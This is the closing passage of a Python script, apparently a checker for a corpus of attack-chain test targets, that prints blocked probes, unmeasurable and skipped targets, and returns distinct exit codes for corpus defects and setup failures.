        print(f"\n{len(surprises)} relaxation probe(s) were blocked after all "
              f"(the detail IS load-bearing):")
        for slug, c in surprises:
            print(f"  {slug:<24} {c.name}")
    if setup_failed:
        print(f"\n{len(setup_failed)} target(s) not measurable this run: "
              f"{', '.join(setup_failed)}")
    for slug, why in VOID.items():
        print(f"\nskipped {slug}: VOID -- {why}")

    # 1 is reserved for "a chain step turned out to be unnecessary", i.e. a
    # corpus defect. A target we could not measure is a setup problem (2), so
    # the two never get confused by a caller that only checks for nonzero.
    if leaks or surprises:
        print("\nFAIL: a chain step is not necessary -- that target measures "
              "something easier than it claims.", file=sys.stderr)
        return 1
    if setup_failed:
        print("\nINCOMPLETE: some targets could not be measured; the result "
              "above is not a clean bill of health.", file=sys.stderr)
        return 2
    return 0


if __name__ == "__main__":
    sys.exit(main())
